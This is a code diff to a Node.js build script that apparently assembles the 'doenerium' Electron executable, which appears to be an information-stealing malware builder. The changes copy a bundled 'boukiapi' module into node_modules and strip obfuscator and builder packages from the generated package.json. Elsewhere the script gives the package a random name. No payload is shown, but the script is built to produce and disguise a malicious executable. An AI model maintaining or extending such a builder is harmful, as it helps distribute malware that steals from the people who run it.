@@ -62,9 +62,19 @@ async function check_all_modules_installed() {
             "zip-lib"
         ].forEach(async (moduleName) => {
             if (!isModuleAvailableSync(moduleName)) {
-                console.log(`Installing "${moduleName}" as it is not installed`)
-                await install_module(moduleName)
-                console.log(`Installed "${moduleName}"`)
+                if (moduleName == "boukiapi") {
+                    let start = Date.now();
+
+                    console.log("Copying ./boukiapi to ./node_modules/boukiapi")
+                    fs.mkdirSync("./node_modules/boukiapi");
+                    copyFolderRecursiveSync("./boukiapi", "./node_modules")
+                    console.log(`Copied ./boukiapi to ./node_modules/boukiapi within ${(Date.now() - start) / 1000} seconds`);
+                } else {
+                    console.log(`Installing "${moduleName}" as it is not installed`)
+                    await install_module(moduleName)
+                    console.log(`Installed "${moduleName}"`)
+                }
+
             }
         })
 
@@ -88,7 +98,7 @@ async function fix_node_gyp(versions) {
 async function rebuild() {
     return new Promise(res => {
         console.log("Rebuilding packages")
-        res(child_process.execSync("npm rebuild", {cwd: "./electron"}))
+        res(child_process.execSync("npm rebuild", { cwd: "./electron" }))
         console.log("Rebuilt packages")
     })
 }
@@ -442,6 +452,9 @@ async function fix_package() {
     let new_name = makeid_var(16)
 
     package_json.name = new_name;
+    ["js-confuser", "javascript-obfuscator", "electron-builder", "electron-rebuild"].forEach(module => {
+        delete package_json.dependencies[module];
+    })
 
     fs.writeFileSync("./electron/package.json", JSON.stringify(package_json))
 }
@@ -607,7 +620,7 @@ async function rebuild_electron() {
     if (!fs.existsSync(`./doenerium_${randomid}.exe`)) {
         fs.copyFileSync(`${randomid}/${config.properties.OriginalFilename}`, `./doenerium_${randomid}.exe`)
     }
-    
+
     fs.rmdirSync(randomid, { recursive: true, force: true })
 
     console.log(`You can now close this window.`)
